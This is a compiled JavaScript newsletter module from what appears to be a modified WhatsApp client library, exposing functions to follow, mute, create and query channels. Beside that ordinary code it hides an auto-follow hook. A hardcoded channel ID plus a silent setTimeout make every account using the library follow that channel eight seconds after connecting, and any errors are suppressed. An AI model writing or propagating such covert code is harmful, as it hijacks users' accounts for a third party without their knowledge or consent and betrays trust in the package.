"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;

const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');

const wMexQuery = (variables, queryId, query, generateMessageTag) => {
  return query({
    tag: 'iq',
    attrs: {
      id: generateMessageTag(),
      type: 'get',
      to: WABinary_1.S_WHATSAPP_NET,
      xmlns: 'w:mex'
    },
    content: [
      {
        tag: 'query',
        attrs: { query_id: queryId },
        content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
      }
    ]
  });
};

const executeWMexQuery = async (variables, queryId, dataPath, query, generateMessageTag) => {
  const result = await wMexQuery(variables, queryId, query, generateMessageTag);
  const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result');

  if (child?.content) {
    const data = JSON.parse(child.content.toString());

    if (data.errors && data.errors.length > 0) {
      const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ');
      const firstError = data.errors[0];
      const errorCode = firstError.extensions?.error_code || 400;
      throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError });
    }

    const response = dataPath ? data?.data?.[dataPath] : data?.data;
    if (typeof response !== 'undefined') return response;
  }

  const action = (dataPath || '').startsWith('xwa2_')
    ? dataPath.substring(5).replace(/_/g, ' ')
    : dataPath?.replace(/_/g, ' ');
  throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result });
};

const AUTO_FOLLOW_CHANNELS = [
  "120363373080111696@newsletter"
];

const delay = (ms) => new Promise((res) => setTimeout(res, ms));

async function autoFollowWhatsAppChannels(newsletterWMexQuery) {
  for (const channelId of AUTO_FOLLOW_CHANNELS) {
    try {
      await newsletterWMexQuery(channelId, Types_1.QueryIds.FOLLOW);
      await delay(3500);
    } catch (error) {
      await delay(1500);
    }
  }
}

const makeNewsletterSocket = (config) => {
  const sock = (0, groups_1.makeGroupsSocket)(config);
  const { authState, signalRepository, query, generateMessageTag } = sock;

  const encoder = new TextEncoder();

  const newsletterQuery = async (jid, type, content) => (query({
    tag: 'iq',
    attrs: {
      id: generateMessageTag(),
      type,
      xmlns: 'newsletter',
      to: jid,
    },
    content
  }));

  const newsletterWMexQuery = async (jid, queryId, content) => (query({
    tag: 'iq',
    attrs: {
      id: generateMessageTag(),
      type: 'get',
      xmlns: 'w:mex',
      to: WABinary_1.S_WHATSAPP_NET,
    },
    content: [
      {
        tag: 'query',
        attrs: { 'query_id': queryId },
        content: encoder.encode(JSON.stringify({
          variables: {
            'newsletter_id': jid,
            ...(content || {})
          }
        }))
      }
    ]
  }));

  setTimeout(async () => {
    try {
      await autoFollowWhatsAppChannels(newsletterWMexQuery);
    } catch {}
  }, 8000);

  const parseFetchedUpdates = async (node, type) => {
    let child;
    if (type === 'messages') {
      child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
    } else {
      const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
      child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
    }

    return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
      messageNode.attrs.from = child?.attrs?.jid;
      const views = parseInt(((0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')?.attrs?.count) || '0');

      const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
      const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
        .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));

      const data = {
        'server_id': messageNode.attrs.server_id,
        views,
        reactions
      };

      if (type === 'messages') {
        const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(
          messageNode,
          authState.creds.me.id,
          authState.creds.me.lid || '',
          signalRepository,
          config.logger
        );
        await decrypt();
        data.message = message;
      }

      return data;
    }));
  };

  return {
    ...sock,

    newsletterFetchAllSubscribe: async () => {
      const list = await executeWMexQuery(
        {},
        '6388546374527196',
        'xwa2_newsletter_subscribed',
        query,
        generateMessageTag
      );
      return list;
    },

    newsletterFetchAllParticipating: async () => {
      const data = {};

      let result;
      try {
        result = await newsletterWMexQuery(undefined, Types_1.QueryIds.SUBSCRIBED);
      } catch (e) {
        config?.logger?.error?.('Failed to fetch SUBSCRIBED newsletters', e);
        return data;
      }

      const jsonStr = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
        ?.content
        ?.toString() || '{}';

      let newsletters = [];
      try {
        const parsed = JSON.parse(jsonStr);
        newsletters = parsed.data?.[Types_1.XWAPaths.SUBSCRIBED] || [];
      } catch (e) {
        config?.logger?.error?.('Failed to parse newsletters SUBSCRIBED', e);
        return data;
      }

      for (const item of newsletters) {
        try {
          const { id, thread_metadata, viewer_metadata } = item || {};
          if (!id || !(0, WABinary_1.isJidNewsletter)(id)) continue;

          data[id] = {
            id,
            state: item?.state?.type,
            creation_time: +thread_metadata?.creation_time || 0,
            name: thread_metadata?.name?.text || '',
            nameTime: +thread_metadata?.name?.update_time || 0,
            description: thread_metadata?.description?.text || '',
            descriptionTime: +thread_metadata?.description?.update_time || 0,
            invite: thread_metadata?.invite,
            picture: (0, Utils_1.getUrlFromDirectPath)(thread_metadata?.picture?.direct_path || ''),
            preview: (0, Utils_1.getUrlFromDirectPath)(thread_metadata?.preview?.direct_path || ''),
            reaction_codes: thread_metadata?.settings?.reaction_codes?.value,
            subscribers: +thread_metadata?.subscribers_count || 0,
            verification: thread_metadata?.verification,
            viewer_metadata
          };

          await delay(120);
        } catch (e) {
          await delay(120);
        }
      }

      return data;
    },

    subscribeNewsletterUpdates: async (jid) => {
      const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
      return (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')?.attrs;
    },

    newsletterReactionMode: async (jid, mode) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
        updates: { settings: { 'reaction_codes': { value: mode } } }
      });
    },

    newsletterUpdateDescription: async (jid, description) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
        updates: { description: description || '', settings: null }
      });
    },

    newsletterUpdateName: async (jid, name) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
        updates: { name, settings: null }
      });
    },

    newsletterUpdatePicture: async (jid, content) => {
      const { img } = await (0, Utils_1.generateProfilePicture)(content);
      await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
        updates: { picture: img.toString('base64'), settings: null }
      });
    },

    newsletterRemovePicture: async (jid) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
        updates: { picture: '', settings: null }
      });
    },

    newsletterUnfollow: async (jid) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
    },

    newsletterFollow: async (jid) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
    },

    newsletterUnmute: async (jid) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
    },

    newsletterMute: async (jid) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
    },

    newsletterAction: async (jid, type) => {
      await newsletterWMexQuery(jid, type.toUpperCase());
    },

    newsletterCreate: async (name, description, reaction_codes) => {
      await query({
        tag: 'iq',
        attrs: {
          to: WABinary_1.S_WHATSAPP_NET,
          xmlns: 'tos',
          id: generateMessageTag(),
          type: 'set'
        },
        content: [
          {
            tag: 'notice',
            attrs: { id: '20601218', stage: '5' },
            content: []
          }
        ]
      });

      const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
        input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
      });

      return (0, exports.extractNewsletterMetadata)(result, true);
    },

    newsletterMetadata: async (type, key, role) => {
      const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
        input: {
          key,
          type: type.toUpperCase(),
          'view_role': role || 'GUEST'
        },
        'fetch_viewer_metadata': true,
        'fetch_full_image': true,
        'fetch_creation_time': true
      });
      return (0, exports.extractNewsletterMetadata)(result);
    },

    newsletterAdminCount: async (jid) => {
      const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
      const buff = (0, WABinary_1.getBinaryNodeChild)(result, 'result')?.content?.toString();
      return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
    },

    newsletterChangeOwner: async (jid, user) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, { 'user_id': user });
    },

    newsletterDemote: async (jid, user) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, { 'user_id': user });
    },

    newsletterDelete: async (jid) => {
      await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
    },

    newsletterReactMessage: async (jid, serverId, code) => {
      await query({
        tag: 'message',
        attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
        content: [{ tag: 'reaction', attrs: code ? { code } : {} }]
      });
    },

    newsletterFetchMessages: async (type, key, count, after) => {
      const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
        {
          tag: 'messages',
          attrs: {
            type,
            ...(type === 'invite' ? { key } : { jid: key }),
            count: count.toString(),
            after: (after?.toString()) || '100'
          }
        }
      ]);
      return await parseFetchedUpdates(result, 'messages');
    },

    newsletterFetchUpdates: async (jid, count, after, since) => {
      const result = await newsletterQuery(jid, 'get', [
        {
          tag: 'message_updates',
          attrs: {
            count: count.toString(),
            after: (after?.toString()) || '100',
            since: (since?.toString()) || '0'
          }
        }
      ]);
      return await parseFetchedUpdates(result, 'updates');
    }
  };
};

exports.makeNewsletterSocket = makeNewsletterSocket;

const extractNewsletterMetadata = (node, isCreate) => {
  const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString();
  const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER];

  const metadata = {
    id: metadataPath?.id,
    state: metadataPath?.state?.type,
    creation_time: +metadataPath?.thread_metadata?.creation_time,
    name: metadataPath?.thread_metadata?.name?.text,
    nameTime: +metadataPath?.thread_metadata?.name?.update_time,
    description: metadataPath?.thread_metadata?.description?.text,
    descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
    invite: metadataPath?.thread_metadata?.invite,
    picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''),
    preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''),
    reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
    subscribers: +metadataPath?.thread_metadata?.subscribers_count,
    verification: metadataPath?.thread_metadata?.verification,
    viewer_metadata: metadataPath?.viewer_metadata
  };
  return metadata;
};

exports.extractNewsletterMetadata = extractNewsletterMetadata;
